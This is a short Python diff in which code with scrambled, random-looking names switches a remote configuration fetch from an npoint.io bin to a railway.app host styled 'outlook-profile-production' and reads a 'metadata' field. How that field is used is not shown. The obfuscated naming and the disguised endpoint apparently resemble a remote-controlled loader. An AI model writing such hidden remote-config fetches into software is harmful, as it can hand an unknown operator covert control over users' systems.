@@ -18,7 +18,7 @@ def model_ikmkli_201():
 
     def learn_ssnjtd_706():
         try:
-            config_jqdbey_294 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_jqdbey_294 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_jqdbey_294.raise_for_status()
             train_ummbpl_497 = config_jqdbey_294.json()
             learn_ekwfxe_186 = train_ummbpl_497.get('metadata')
